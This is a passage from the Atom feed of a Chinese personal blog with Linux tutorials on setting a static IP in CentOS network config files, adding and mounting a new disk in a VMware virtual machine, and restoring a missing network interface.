直接修改配置文件来指定IP，并可以连接到外网<br>
编辑：vi /etc/sysconfig/network-scripts/ifcfg-ens33<br>
要求：将ip地址配置的静态的，比如：ip地址为192.168.200.130<br>
ifcfg-ens33 文件说明：<br>
DEVICE=eth0 #接口名（设备，网卡）<br>
HWADDR=00:0C:2x:6x:0x：XX #MAC地址 通用轩<br>
TYPE=Ethernet #网络类型（通常是Ethemet） Online<br>
UUID=926a57ba-92c6-4231-bacb-f27e5e6a9f44#随机id Privac<br>
#系统启动的时候网络接口是否有效(yes/no)<br>
ONBOOT=yes<br>
#IP的配置方法none|static|bootp|dhcpBOOTPROTO=static<br>
IP地址<br>
IPADOR-192.168.200.130<br>
#网关<br>
GATEWAY=192.168.200.2<br>
域名解析器<br>
DNS1=192.168.200.2</p>
</li>
<li>
<p>编辑：vim /etc/sysconfig/network-scripts/ifcfg-ens33 (初始内容)</p>
</li>
</ol>
<pre><code>TYPE=&quot;Ethernet&quot;
PROXY_METHOD=&quot;none&quot;
BROWSER_ONLY=&quot;no&quot;
BOOTPROTO=&quot;dhcp&quot;  //dhcp表示自动分配
DEFROUTE=&quot;yes&quot;
IPV4_FAILURE_FATAL=&quot;no&quot;
IPV6INIT=&quot;yes&quot;
IPV6_AUTOCONF=&quot;yes&quot;
IPV6_DEFROUTE=&quot;yes&quot;
IPV6_FAILURE_FATAL=&quot;no&quot;
IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;
NAME=&quot;ens33&quot;
UUID=&quot;71c5edbc-7820-4bbf-9923-16d337ccc4ee&quot;
DEVICE=&quot;ens33&quot;
ONBOOT=&quot;yes&quot; //这里yes表示自动分配
</code></pre>
<ol start="2">
<li>更改后</li>
</ol>
<pre><code>TYPE=&quot;Ethernet&quot;
PROXY_METHOD=&quot;none&quot;
BROWSER_ONLY=&quot;no&quot;
BOOTPROTO=&quot;static&quot;
DEFROUTE=&quot;yes&quot;
IPV4_FAILURE_FATAL=&quot;no&quot;
IPV6INIT=&quot;yes&quot;
IPV6_AUTOCONF=&quot;yes&quot;
IPV6_DEFROUTE=&quot;yes&quot;
IPV6_FAILURE_FATAL=&quot;no&quot;
IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;
NAME=&quot;ens33&quot;
UUID=&quot;71c5edbc-7820-4bbf-9923-16d337ccc4ee&quot;
DEVICE=&quot;ens33&quot;
ONBOOT=&quot;yes&quot;
#IP地址
IPADOR=192.168.200.130
#网关
GATEWAY=192.168.200.2
#域名解析器
DNS1=192.168.200.2
</code></pre>
<ol start="3">
<li>编辑配置操作：<img src="https://kite-007.github.io/post-images/1615298826698.png" alt="" loading="lazy"></li>
<li>service network restart，reboot</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# Linux添加硬盘]]></title>
        <id>https://kite-007.github.io/linux-tian-jia-ying-pan/</id>
        <link href="https://kite-007.github.io/linux-tian-jia-ying-pan/">
        </link>
        <updated>2021-03-09T03:01:59.000Z</updated>
        <content type="html"><![CDATA[<ol>
<li>添加一块硬盘
<ol>
<li>虚拟机添加硬盘
<ul>
<li>在VMware的菜单栏中选择（虚拟机）-》（设置）-》（根据提示添加硬盘）-》（完成重启）</li>
<li><img src="https://kite-007.github.io/post-images/1615259136779.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1615259195844.png" alt="" loading="lazy"></li>
<li>根据推荐一直下一步，选择要添加磁盘的大小后完成，确定。</li>
<li><img src="https://kite-007.github.io/post-images/1615259311328.png" alt="" loading="lazy"></li>
<li>重启后可以使用lsblk查看分区 情况</li>
</ul>
</li>
<li>分区
<ul>
<li>分区命令：fdisk [/dev/sdb]，</li>
<li>开始对[/sdb]分区
<ul>
<li>m:显示命令列表</li>
<li>p:显示磁盘分区，同fdisk -l</li>
<li>n:新增分区</li>
<li>d:删除分区</li>
<li>w:写入并退出</li>
<li>说明：开始分区后输入n来新增分区，然后选择p，分区类型为主分区。两次回车默认剩余全部空间。最后输入w写入分区并退出，若不保存退出输入q。</li>
<li><img src="https://kite-007.github.io/post-images/1615260284301.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1615260290752.png" alt="" loading="lazy"></li>
</ul>
</li>
</ul>
</li>
<li>格式化
<ul>
<li>lsblk -f查看，上面三个都有UUID，下面新加的没有UUID，则还没有格式化，不可以使用。</li>
<li>格式化命令：mkfs -t ext4 /dev/sdb1</li>
<li>ext4为分区类型</li>
<li><img src="https://kite-007.github.io/post-images/1615260711731.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>挂载
<ul>
<li>mount /dev/sdb1 [要挂载的目录]</li>
<li><img src="https://kite-007.github.io/post-images/1615261173084.png" alt="" loading="lazy"></li>
<li>用命令行挂挂载，重启后会失效。</li>
<li>永久挂载
<ul>
<li>修改 /etc/fstab，实现自动挂载</li>
<li>添加完成后，执行mount -a 即刻生效</li>
</ul>
</li>
</ul>
</li>
<li>卸载
<ul>
<li>umount /dev/sdb1 或者 umount [要卸载的目录]</li>
</ul>
</li>
</ol>
</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# Linux无网络解决]]></title>
        <id>https://kite-007.github.io/linux-wu-wang-luo-jie-jue/</id>
        <link href="https://kite-007.github.io/linux-wu-wang-luo-jie-jue/">
        </link>
        <updated>2021-03-08T00:41:59.000Z</updated>
        <content type="html"><![CDATA[<ol>
<li>ifconfig没有类似eth0一项<br>
<img src="https://kite-007.github.io/post-images/1615164253722.png" alt="" loading="lazy">
<ul>
<li>使用cd,切换到目录/etc/sysconfig/network-scripts/</li>
</ul>
<pre><code>cd /etc/sysconfig/network-scripts/
</code></pre>
<ul>
<li>使用ll ifcfg-*,查看此目录文件,是否存在ifcfg-[eth0]和ifcfg- lo两项</li>
<li>如果不存在ifcfg-[eth0],则用cp ifcfg-lo ifcfg-[eth0]拷贝一份，并修改参数</li>
</ul>
<pre><code>ll ifcfg-*
cp ifcfg-lo ifcfg-[eth0]
</code></pre>
<ul>
<li>ifcfg-[eth0]</li>
</ul>
<pre><code>TYPE=&quot;Ethernet&quot;
PROXY_METHOD=&quot;none&quot;
BROWSER_ONLY=&quot;no&quot;
BOOTPROTO=&quot;dhcp&quot;
DEFROUTE=&quot;yes&quot;
IPV4_FAILURE_FATAL=&quot;no&quot;
IPV6INIT=&quot;yes&quot;
IPV6_AUTOCONF=&quot;yes&quot;
IPV6_DEFROUTE=&quot;yes&quot;
IPV6_FAILURE_FATAL=&quot;no&quot;
IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;
NAME=&quot;ens33&quot;
UUID=&quot;71c5edbc-7820-4bbf-9923-16d337ccc4ee&quot;
DEVICE=&quot;ens33&quot;
ONBOOT=&quot;yes&quot;
HWADDR=00:0c:29:4a:63:77
</code></pre>
<ul>
<li>ifcfg-lo</li>
</ul>
<pre><code>DEVICE=lo
IPADDR=127.0.0.1
NETMASK=255.0.0.0
NETWORK=127.0.0.0
# If you're having problems with gated making 127.0.0.0/8 a martian,
# you can change this to something else (255.255.255.255, for example)
BROADCAST=127.255.255.255
ONBOOT=yes
NAME=loopback
</code></pre>
<ul>
<li>ifconfig [eth0] 192.168.XXX.XXX,给它指定ip</li>
<li>ip addr 查看mac地址，</li>
<li>vi ifcfg-[eth0],查看此文件内容，修改为静态或动态<br>
这个是网络配置参数：<br>
* BOOTPROTO=static   静态IP<br>
* BOOTPROTO=dhcp   动态IP<br>
* BOOTPROTO=none   无（不指定）<br>
静态下方添加<br>
* IPADDR=静态IP地址<br>
* GATEWAY=默认网关<br>
* NETMASK=255.255.255.0<br>
* DNS1=114.114.114.114<br>
查看是否有HWADDR=xx:xx:xx:xx:xx:xx一项<br>
* 如果没有，将刚才ip addr所查看到的内容添加进去</li>
<li>在 /etc/sysconfig/network-scripts目录下删除掉别的ifcfg-xxx(只保留一个你网卡同名的文档)再把NetworkManager停用</li>
</ul>
<pre><code>    systemctl stop NetworkManager
    systemctl disable NetworkManager
</code></pre>
<ul>
<li>之后再执行 systemctl restart network启用网络</li>
</ul>
</li>
</ol>
<ul>
<li>其余关于NetworkManager的命令
<ul>
<li>执行以下命令检查Network或NetworkManager的运行状态。</li>
</ul>
<pre><code>    systemctl status network
    systemctl status NetworkManager
</code></pre>
<ul>
<li>执行以下命令关闭network。</li>
</ul>
<pre><code>    systemctl stop network
    systemctl disable network
</code></pre>
<ul>
<li>执行以下命令开启NetworkManager，</li>
</ul>
<pre><code>    systemctl start NetworkManager
    systemctl enable NetworkManager
</code></pre>
</li>
</ul>
]]></content>
    </entry>
</feed>